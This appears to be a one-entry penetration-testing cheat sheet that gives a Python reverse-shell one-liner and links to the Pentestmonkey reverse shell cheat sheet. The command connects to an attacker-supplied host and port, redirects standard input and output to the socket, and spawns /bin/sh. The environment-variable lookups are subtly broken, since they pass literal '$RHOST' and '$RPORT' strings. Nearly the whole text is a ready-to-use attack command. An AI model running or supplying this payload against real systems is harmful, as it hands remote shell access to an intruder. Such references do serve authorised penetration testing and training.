# Python

```
$ export RHOST="<IP>";export RPORT=<PORT>; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("$RHOST"),int(os.getenv("$RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

---
## References

- [Reverse Shell Cheatsheet Pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)